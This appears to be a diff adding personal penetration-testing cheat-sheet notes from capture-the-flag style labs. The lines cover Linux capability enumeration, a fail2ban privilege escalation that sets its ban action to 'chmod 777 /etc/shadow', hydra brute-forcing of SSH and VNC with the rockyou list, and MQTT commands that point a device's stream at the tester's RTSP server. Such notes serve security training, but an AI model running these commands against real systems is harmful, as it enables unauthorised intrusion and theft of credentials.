@@ -1918,3 +1918,68 @@ kubectl --token "$(cat token.txt)" --insecure-skip-tls-verify --server=https://t
 
 ------------------
 hello
+sudo apt-get update && sudo apt-get upgrade
+
+capabilites
+
+/usr/bin/python3.7 = cap_setuid+ep
+
+getcap -r / 2>/dev/null
+
+
+openport 5985,5986 - Pentesting OMI
+
+wrms vul omigod.py
+
+generating fourdigit using bashscript
+for i in {0000..9999}; do echo "$i"; done > pins.txt
+
+ssl password generate
+openssl passwd -6 -salt xyz pwned
+
+fail2ban exploit PE vector
+
+
+
+edit the configuration file
+nano /etc/fail2ban/action.d/iptables-multiport.conf
+
+------------------------
+#
+#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+actionban = chmod 777 /etc/shadow
+
+# Option:  actionunban
+
+---------------------------------
+
+restart service 
+sudo /bin/systemctl restart fail2ban
+
+using hydra to bruteforce ssh to triger fail2ban action 
+hydra -l fail2exploit -P /usr/share/wordlists/rockyou.txt ssh://10.10.21.12 
+
+exploit works 
+
+hyrda for vnc
+
+hydra -s 5900  -P /usr/share/wordlists/rockyou.txt -t 16 10.10.12.202 vnc
+
+install remmina 
+
+sudo apt-get update
+sudo apt-get -y install remmina
+
+checking open port 
+sudo ss  -------connected 
+sudo ss -tulpn  -----------listening
+
+mosquitto_sub -h 10.10.240.46 -t device/init 
+
+mosquitto_pub -h 10.10.240.46 -t device/CNZ1CN7TCPKY9LMEHSDY/cmd -m  "{"CMD":10,"URL":"RTSP://10.9.25.139:8554/home/dwight/Desktop/aoc2022/day21"}"
+
+docker run --rm -it --network=host aler9/rtsp-simple-server
+
+generating hmac with key by using openssl from shell | key = "3RfDFz82"
+
+cat order.txt | openssl dgst -sha256 -hmac ""
